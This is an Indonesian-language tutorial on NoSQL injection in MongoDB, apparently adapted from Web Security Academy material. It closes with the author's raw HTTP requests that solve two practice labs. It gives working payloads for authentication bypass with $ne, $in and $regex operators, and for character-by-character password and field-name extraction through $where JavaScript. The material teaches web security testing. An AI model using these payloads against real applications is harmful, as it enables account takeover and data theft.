
## Jenis injeksi NoSQL

Ada dua jenis injeksi NoSQL yang berbeda:

- Injeksi sintaksis - Ini terjadi ketika Anda dapat merusak sintaks kueri NoSQL, sehingga memungkinkan Anda untuk menginjeksi sintaksis Anda sendiri muatan. Metodologinya mirip dengan yang digunakan dalam injeksi SQL. Namun sifat serangannya berbeda-beda secara signifikan, karena database NoSQL menggunakan berbagai bahasa kueri, jenis sintaksis kueri, dan struktur data yang berbeda.
- Injeksi operator - Ini terjadi ketika Anda bisa menggunakan operator kueri NoSQL untuk memanipulasi kueri.

Dalam topik ini, kita akan melihat cara menguji kerentanan NoSQL secara umum, kemudian fokus pada eksploitasi kerentanan di MongoDB, yang merupakan database NoSQL paling populer. Kami juga menyediakan beberapa laboratorium sehingga Anda dapat mempraktikkan apa yang telah Anda pelajari.

## Injeksi operator NoSQL

Basis data NoSQL sering kali menggunakan operator kueri, yang menyediakan cara untuk menentukan kondisi yang harus dipenuhi data agar dapat disertakan dalam hasil kueri. Contoh operator kueri MongoDB meliputi:

- `$where` - Mencocokkan dokumen yang memenuhi ekspresi JavaScript.
- `$ne` - Mencocokkan semua nilai yang tidak sama dengan nilai yang ditentukan.
- `$in` - Cocok dengan semua nilai yang ditentukan dalam array.
- `$regex` - Memilih dokumen yang nilainya cocok dengan ekspresi reguler yang ditentukan.

Anda mungkin dapat memasukkan operator kueri untuk memanipulasi kueri NoSQL. Untuk melakukan hal ini, kirimkan operator yang berbeda secara sistematis ke dalam serangkaian masukan pengguna, lalu tinjau tanggapannya untuk melihat pesan kesalahan atau perubahan lainnya.


## Mengirimkan operator kueri

Dalam pesan JSON, Anda bisa menyisipkan operator kueri sebagai objek bertumpuk. Misalnya, `{"username":"wiener"}` menjadi `{"username":{"$ne":"invalid"}}`.

Untuk masukan berbasis URL, Anda dapat memasukkan operator kueri melalui parameter URL. Misalnya, `username=wiener` menjadi `username[$ne]=invalid`. Jika tidak berhasil, Anda dapat mencoba yang berikut ini:

1. Konversikan metode permintaan dari `GET` ke `POST`.
2. Ubah `Content-Type` tajuk ke `application/json`.
3. Tambahkan JSON ke isi pesan.
4. Suntikkan operator kueri di JSON.

## Mendeteksi injeksi operator di MongoDB

Pertimbangkan aplikasi rentan yang menerima nama pengguna dan kata sandi di badan a `POST` meminta:

`{"username":"wiener","password":"peter"}`

Uji setiap masukan dengan berbagai operator. Misalnya, untuk menguji apakah masukan nama pengguna memproses operator kueri, Anda dapat mencoba injeksi berikut:

`{"username":{"$ne":"invalid"},"password":{"peter"}}`

Jika `$ne` operator diterapkan, ini menanyakan semua pengguna yang nama penggunanya tidak sama `invalid`.

Jika input nama pengguna dan kata sandi diproses oleh operator, autentikasi dapat dilewati menggunakan payload berikut:

`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

Kueri ini mengembalikan semua kredensial login yang nama pengguna dan kata sandinya tidak sama `invalid`. Hasilnya, Anda masuk ke aplikasi sebagai pengguna pertama dalam koleksi.

Untuk menargetkan akun, Anda dapat membuat payload yang menyertakan nama pengguna yang diketahui, atau nama pengguna yang sudah Anda tebak. Misalnya:

`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`


## Memanfaatkan injeksi sintaksis untuk mengekstrak data

Di banyak database NoSQL, beberapa operator atau fungsi kueri dapat menjalankan kode JavaScript terbatas, seperti MongoDB `$where` operator dan `mapReduce()` fungsi. Artinya, jika aplikasi yang rentan menggunakan operator atau fungsi ini, database dapat mengevaluasi JavaScript sebagai bagian dari kueri. Oleh karena itu, Anda mungkin dapat menggunakan fungsi JavaScript untuk mengekstrak data dari database.


## Mengeksfiltrasi data di MongoDB

Pertimbangkan aplikasi rentan yang memungkinkan pengguna mencari nama pengguna lain yang terdaftar dan menampilkan peran mereka. Ini memicu permintaan ke URL:

`https://insecure-website.com/user/lookup?username=admin`

Ini menghasilkan kueri NoSQL berikut dari `users` koleksi:

`{"$where":"this.username == 'admin'"}`

Saat kueri menggunakan `$where` operator, Anda dapat mencoba memasukkan fungsi JavaScript ke dalam kueri ini sehingga mengembalikan data sensitif. Misalnya, Anda dapat mengirimkan payload berikut:

`admin' && this.password[0] == 'a' || 'a'=='b`

Ini mengembalikan karakter pertama dari string kata sandi pengguna, memungkinkan Anda mengekstrak kata sandi karakter demi karakter.

Anda juga bisa menggunakan JavaScript `match()` berfungsi untuk mengekstrak informasi. Misalnya, payload berikut memungkinkan Anda mengidentifikasi apakah kata sandi berisi angka:

`admin' && this.password.match(/\d/) || 'a'=='b`

## MongoDB

Pertimbangkan aplikasi rentan yang menerima nama pengguna dan kata sandi di badan a `POST` meminta:

`{"username":"wiener","password":"peter"}`

Untuk menguji apakah Anda dapat memasukkan operator, Anda dapat mencoba menambahkan `$where` operator sebagai parameter tambahan, lalu mengirimkan satu permintaan yang kondisinya bernilai salah, dan permintaan lainnya bernilai benar. Misalnya:

`{"username":"wiener","password":"peter", "$where":"0"}``{"username":"wiener","password":"peter", "$where":"1"}`

Jika ada perbedaan antara tanggapan, ini mungkin menunjukkan bahwa ekspresi JavaScript di `$where` klausa sedang dievaluasi.


## Mengekstraksi nama bidang

Jika Anda telah memasukkan operator yang memungkinkan Anda menjalankan JavaScript, Anda mungkin dapat menggunakan `keys()` metode untuk mengekstrak nama bidang data. Misalnya, Anda dapat mengirimkan payload berikut:

`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`

Ini memeriksa bidang data pertama di objek pengguna dan mengembalikan karakter pertama dari nama bidang. Ini memungkinkan Anda mengekstrak nama bidang karakter demi karakter.

## Mengeksfiltrasi data menggunakan operator

Alternatifnya, Anda mungkin dapat mengekstrak data menggunakan operator yang tidak memungkinkan Anda menjalankan JavaScript. Misalnya, Anda mungkin dapat menggunakan `$regex` operator untuk mengekstrak data karakter demi karakter.

Pertimbangkan aplikasi rentan yang menerima nama pengguna dan kata sandi di badan a `POST` meminta. Misalnya:

`{"username":"myuser","password":"mypass"}`

Anda bisa mulai dengan menguji apakah `$regex` operator diproses sebagai berikut:

`{"username":"admin","password":{"$regex":"^.*"}}`

Jika respons terhadap permintaan ini berbeda dengan respons yang Anda terima saat Anda memasukkan kata sandi yang salah, ini menunjukkan bahwa aplikasi tersebut mungkin rentan. Anda dapat menggunakan `$regex` operator untuk mengekstrak data karakter demi karakter. Misalnya, payload berikut memeriksa apakah kata sandi dimulai dengan `a`:

`{"username":"admin","password":{"$regex":"^a*"}}`

---

**Solve Lab 1**

payload: `%27%7c%7c%31%7c%7c%27`

```json
GET /filter?category=Gifts%27%7c%7c%31%7c%7c%27 HTTP/2
Host: 0aff00c20483b9c680b4bd620012009f.web-security-academy.net
Cookie: session=HWBpfctWXI5mhmHJjBLWMcL6Tuoq9fPb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aff00c20483b9c680b4bd620012009f.web-security-academy.net/filter?category=Food+%26+Drink
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```


**Solve LAB 2**

```json
POST /login HTTP/2
Host: 0aa6002a04bb634180169e9d00f4004b.web-security-academy.net
Cookie: session=pTPGskx8DuAI2FgnmMkIN7ldM01I9kwf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa6002a04bb634180169e9d00f4004b.web-security-academy.net/login
Content-Type: application/json
Content-Length: 56
Origin: https://0aa6002a04bb634180169e9d00f4004b.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"username":{
	"$regex": "^a"
},"password":{"$ne":""}}
```

set cookie nya ke storage


